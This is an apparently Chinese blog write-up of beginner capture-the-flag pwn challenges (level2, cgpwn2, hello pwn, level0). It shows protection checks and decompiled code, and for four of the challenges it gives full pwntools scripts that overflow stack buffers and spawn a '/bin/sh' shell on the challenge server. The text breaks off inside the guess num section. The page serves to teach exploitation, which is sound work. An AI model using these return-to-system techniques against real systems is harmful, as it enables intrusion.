<!--
	作者：Sariay
	时间：2018-08-26
	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
-->
<!DOCTYPE html>
<html class="html-loading">
		

<head><meta name="generator" content="Hexo 3.9.0">
	<meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <title>
    
      攻防世界pwn新手区 | Thriumph
    
  </title>
  <meta name="author" content="Thriumph">
  <meta name="keywords" content="pwn,re,渗透测试">
  <meta name="description" content="不将就、不妥协、不停留">
	<!-- favicon -->
  <link rel="shortcut icon" href="/img/favicon.ico">

  <!-- css -->
  <link rel="stylesheet" href="/css/Annie.css">
  
  <!-- jquery -->
	<script src="/plugin/jquery/jquery.min.js"></script>

<script>
    const CONFIG_BGIMAGE = {
      mode: 'normal',
      normalSrc: 'https://source.unsplash.com/collection/954550/1920x1080',
      randomYouMax: 110,
      randomYouSrc: '/',
	  randomOtherSrc: '/',
	  preloaderEnable: true
    }
	
    const CONFIG_LEACLOUD_COUNT = {
      enable: true,
	  appId: 'AU8...',
	  appKey: '4cU...',
	  serverURLs: 'http' || ' '
    }
  </script>
</head>
	<body>
		<!-- Preloader -->

	<div id="preloader">
		<div class="pre-container">
			
				<div class="spinner">
					<div class="double-bounce1"></div>
					<div class="double-bounce2"></div>
				</div>
						
		</div>
	</div>


<!-- header -->
<header class="fixbackground bg-pan-br">
	<div class="mask">
		<!-- motto -->
		<div class="h-body">	
			
				<div class="motto text-shadow-pop-left">
					<p class="content" id="motto-content">获取中...</p>
					<p>-<p>
					<p class="author" id="motto-author">Just a minute...</p>
				</div>
			
		</div>
		
		<!-- others: such as time... -->			
		<div class="h-footer">
			<a href="javascript:;" id="read-more" class="scroll-down">
				<span class="icon-anchor1 animation-scroll-down"></span>
			</a>
		</div>
	</div>
</header>

<div id="navigation-hide">
	<!-- Progress bar -->
	<div id="progress-bar"></div>

	<!-- Progress percent -->
	<div id="progress-percentage"><span>0.0%</span></div>

	<div class="toc-switch"><span class="switch-button">目录</span></div>

	<!-- Page title -->
	<p>
		
			「攻防世界pwn新手区」
		
	</p>

	
	
		<span id="star-button" rel="unlike">
			<i class="icon-heart"></i>
		</span>
	

	<!-- Nav trigger for navigation-H-->
	<a class="nav-trigger"><span></span></a>
</div>

<!-- Navigation in div(id="navigation-H") -->
<nav class="nav-container" id="cd-nav">
	<div class="nav-header">
		<span class="logo"> 
			<img src="/img/logo.png">
		</span>
		<a href="javascript:;" class="nav-close"></a>
	</div>
	
	<div class="nav-body">
		<ul id="global-nav">
	
		<li class="menu-home">
			<a href="/" class="menu-item-home" target="_blank">主页</a>
		</li>
		
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
		</li>
		
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
		</li>
		
	
		<li class="menu-about">
			<a href="/about" class="menu-item-about" target="_blank">关于</a>
		</li>
		
	

	
</ul>
	</div>
	
	<div class="nav-footer">
		<ul id="global-social">
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-zhihu"></span>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-github"></span>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-sina-weibo "></span>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-pinterest2"></span>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-instagram"></span>
			</a>
		</li>
	
		<li>
			<a href="http://github.com/" target="_blank">
				<span class="icon-twitter"></span>
			</a>
		</li>
	
		<li>
			<a href="/atom.xml" target="_blank">
				<span class="icon-rss"></span>
			</a>
		</li>
			
</ul>

	</div>
</nav>
			
		<!--main-->
		<main>
			<!--
	时间：2018-11-17
	描述：
		插件名称：katelog.min.js
		插件作者：KELEN
		插件来源: https://github.com/KELEN/katelog
-->

	
		<div class="layout-toc">
			<div id="layout-toc">
				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
			</div>
		</div>

		<script src="/plugin/toc/katelog.min.js"></script>

		
	 

<div class="layout-post">
	<div id="layout-post">
		<div class="article-title">
			
	<a href="/攻防世界pwn新手区.html" itemprop="url">
		攻防世界pwn新手区
	</a>

		</div>

		<div class="article-meta">
			<span>
				<i class="icon-calendar1"></i>
				
				




	更新于

	<a href="/攻防世界pwn新手区.html" itemprop="url">
		<time datetime="2019-11-18T15:04:14.000Z" itemprop="dateUpdated">
	  		2020-01-20
	  </time>
	</a> 



			</span>
			<span>
				
	<i class="icon-price-tags"></i>
	
		<a href="/tags/ctf/" class=" ">
			ctf
		</a>
	
		<a href="/tags/pwn/" class=" ">
			pwn
		</a>
	
		
			</span>
			
			

	
    <span class="leancloud_visitors" id="/攻防世界pwn新手区.html_visitors" data-url="/攻防世界pwn新手区.html" data-title="攻防世界pwn新手区">
       	<i class="icon-eye"></i>
       	热度
        
            <i class="leancloud_visitors_count" id="leancloud_visitors_count">1</i>
                   
    </span>
    



	
    <span class="leancloud_likes" id="/攻防世界pwn新手区.html_likes" data-url="/攻防世界pwn新手区.html" data-title="攻防世界pwn新手区" rel="unlike">
        <i class="icon-heart"></i>
        喜欢
        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
    </span>
	

		</div>

		<div class="article-content" id="article-content">
			<p>攻防世界pwn新手区wp</p>
<a id="more"></a>
<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><h2 id="查看保护机制"><a href="#查看保护机制" class="headerlink" title="查看保护机制"></a>查看保护机制</h2><p><img src="/攻防世界pwn新手区/1.png" alt><br>只开启了NX保护</p>
<h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><p><strong>main函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">"echo 'Hello World!'"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>vulnerable_function()函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>查看system函数</strong><br><img src="/攻防世界pwn新手区/2.png" alt><br>system函数的地址是0x08048320<br>system()函数没有直接输入”/bin/sh”<br>查找到有”/bin/sh”,地址是 0x0804a024<br><img src="/攻防世界pwn新手区/3.png" alt></p>
<p>vulnerable_function()函数存在溢出, buf的长度为0x88，可以输入0x200的长度,可以在system()后面添加”/bin/sh”的地址，然后构造payload在buf后面调用系统函数得到shell</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'34085'</span>)</span><br><span class="line">sys_addr=<span class="number">0x08048320</span></span><br><span class="line"><span class="comment">#sys_addr=elf.symbols['system'] 获取系统函数地址</span></span><br><span class="line">sh_addr=<span class="number">0x0804a024</span></span><br><span class="line"><span class="comment">#sh_addr=elf.search('/bin/sh').next() 获取'/bin/sh'字符串地址</span></span><br><span class="line">payload+=<span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) <span class="comment">#填充垃圾数据</span></span><br><span class="line">payload+=p32(sys_addr) <span class="comment">#覆盖返回地址到system函数</span></span><br><span class="line">payload+=p32(<span class="number">66666</span>) <span class="comment">#随意填写system函数调用后的返回地址</span></span><br><span class="line">payload+=p32(<span class="number">0x0804a024</span>) <span class="comment">#system函数的参数，指向“/bin/sh”，实现调用</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><h2 id="查看文件基本信息"><a href="#查看文件基本信息" class="headerlink" title="查看文件基本信息"></a>查看文件基本信息</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Thriumph@ubuntu:~/pwn/gfsj$ file cgpwn2 </span><br><span class="line">cgpwn2: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.24</span>, BuildID[sha1]=<span class="number">86982</span>eca8585ab1b30762b8479a6071dbf584559, <span class="keyword">not</span> stripped</span><br><span class="line">Thriumph@ubuntu:~/pwn/gfsj$ checksec cgpwn2 </span><br><span class="line">[*] '/home/Thriumph/pwn/gfsj/cgpwn2'</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span></span></span></span><br></pre></td></tr></table></figure>

<p>开启了NX保护，没有canary和PIE</p>
<h2 id="查看main（）函数"><a href="#查看main（）函数" class="headerlink" title="查看main（）函数"></a>查看main（）函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  hello();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"thank you"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="查看hello-函数"><a href="#查看hello-函数" class="headerlink" title="查看hello()函数"></a>查看hello()函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+12h] [ebp-26h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+14h] [ebp-24h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;s;</span><br><span class="line">  v1 = <span class="number">30</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;s &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)&amp;s = <span class="number">0</span>;</span><br><span class="line">    v0 = (<span class="keyword">char</span> *)&amp;v6;</span><br><span class="line">    v1 = <span class="number">28</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)&amp;v0[v2] = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; (v1 &amp; <span class="number">0xFFFFFFFC</span>) );</span><br><span class="line">  v3 = &amp;v0[v2];</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)v3 = <span class="number">0</span>;</span><br><span class="line">    v3 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; <span class="number">1</span> )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please tell me your name"</span>);</span><br><span class="line">  fgets(name, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"hello,you can leave some message here:"</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要输入name和message<br>char s; // [esp+12h] [ebp-26h]，s的大小为0x26<br>return gets(&amp;s);中gets函数存在溢出</p>
<h2 id="查看pwn-函数"><a href="#查看pwn-函数" class="headerlink" title="查看pwn()函数"></a>查看pwn()函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"echo hehehe"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用了system函数，但是并没有执行”/bin/sh”，我们自己构造然后传入进去就可以了。</p>
<h2 id="查看name函数"><a href="#查看name函数" class="headerlink" title="查看name函数"></a>查看name函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0804</span>A080 name            db <span class="number">34</span><span class="function">h <span class="title">dup</span><span class="params">(?)</span>           </span>; DATA XREF: hello+<span class="number">77</span>↑o</span><br><span class="line">.bss:<span class="number">0804</span>A080 _bss            ends</span><br></pre></td></tr></table></figure>

<p>0804A080是name的地址，name在bss段上，是一个全局变量，构造”/bin/sh”传入到name中，那么”/bin/sh”的地址就是name的地址。然后调用system函数去调用就可以了。<br>用gdb调试，查看出偏移为42.</p>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>将返回地址覆盖为system函数的地址，然后传入name，这时，相当于给system传入了”/bin/sh”作为参数。<br>构造payload,payload=”a” * 42 +p32(sys_addr) +”a” * 4 + p32(name)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,<span class="string">"39125"</span>)</span><br><span class="line">elf=ELF(<span class="string">'./cgpwn2'</span>)</span><br><span class="line">name = <span class="number">0x0804A080</span></span><br><span class="line">sys_addr=elf.symbols[<span class="string">'system'</span>]<span class="comment">#system地址，也能直接在程序中找，sys_addr=0x08048420</span></span><br><span class="line">p.recvuntil(<span class="string">"your name"</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"leave some message here:"</span>)</span><br><span class="line">payload=<span class="string">"a"</span> * <span class="number">42</span> +p32(sys_addr) +<span class="string">"a"</span> * <span class="number">4</span> + p32(name)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello pwn"></a>hello pwn</h1><h2 id="查看文件信息"><a href="#查看文件信息" class="headerlink" title="查看文件信息"></a>查看文件信息</h2><p><img src="/攻防世界pwn新手区/4.png" alt><br>没有canary保护，地址固定</p>
<h2 id="ida查看"><a href="#ida查看" class="headerlink" title="ida查看"></a>ida查看</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"~~ welcome to ctf ~~     "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"lets get helloworld for bof"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;unk_601068, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( dword_60106C == <span class="number">0x6E756161</span> )</span><br><span class="line">    sub_400686();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显的bof，查看sub_400686</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_400686</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  system(<span class="string">"cat flag.txt"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用了system函数。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><strong>read(0, &amp;unk_601068, 0x10uLL);</strong> read函数，第一个参数为0，代表标准输入，第三个参数是输入的个数是0x10，即16个字节。就是从0x601068开始往后读取16个字节。当dword_60106C == 0x6E756161时可以得到flag，所以在read处溢出unk_601068覆盖dword_60106c为0x6E756161就行了</p>
<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'38347'</span>)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">4</span>+p32(<span class="number">0x6E756161</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h1><h2 id="查看文件信息-1"><a href="#查看文件信息-1" class="headerlink" title="查看文件信息"></a>查看文件信息</h2><p><img src="/攻防世界pwn新手区/5.png" alt><br>只开启了NX保护</p>
<h2 id="ida查看-1"><a href="#ida查看-1" class="headerlink" title="ida查看"></a>ida查看</h2><p><strong>main函数：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很简单，输出helloworld然后调用vulnerable_function()函数。</p>
<p><strong>查看vulnerable_function()函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>buf是80h,栈上可以需要覆盖返回地址，因为是64为，需要覆盖80h+8h,也就是88h,然后就能调用想要调用的地址了。<br><strong>查看callsystem函数</strong><br><img src="/攻防世界pwn新手区/6.png" alt><br>调用了system函数，所以覆盖返回地址为system的地址就行了。system地址是0x400596</p>
<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'41896'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(<span class="number">0x400596</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="guess-num"><a href="#guess-num" class="headerlink" title="guess num"></a>guess num</h1><p>涉及两个函数，srand函数和rand函数。还有pthon,c混合编程</p>
<h2 id="查看文件信息-2"><a href="#查看文件信息-2" class="headerlink" title="查看文件信息"></a>查看文件信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Thriumph@ubuntu:~/pwn$ file 1</span><br><span class="line">1: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=c5689a0b4458c068fb51e3a2c167b112c3ba7323, stripped</span><br><span class="line">Thriumph@ubuntu:~/pwn$ checksec 1</span><br><span class="line">[*] &apos;/home/Thriumph/pwn/1&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>开启了canary保护，堆栈不可执行保护还有pie。</p>
<h2 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to a guess number game!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please let me know your name!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your name:"</span>, <span class="number">0L</span>L);</span><br><span class="line">  gets(&amp;v8);                     <span class="comment">//get函数是漏洞点，造成了栈溢出漏洞</span></span><br><span class="line">  v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)seed[<span class="number">0</span>];</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )     <span class="comment">//循环十次</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = rand() % <span class="number">6</span> + <span class="number">1</span>;         <span class="comment">//在1~6中产生一个随机整数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------------Turn:%d-------------\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span 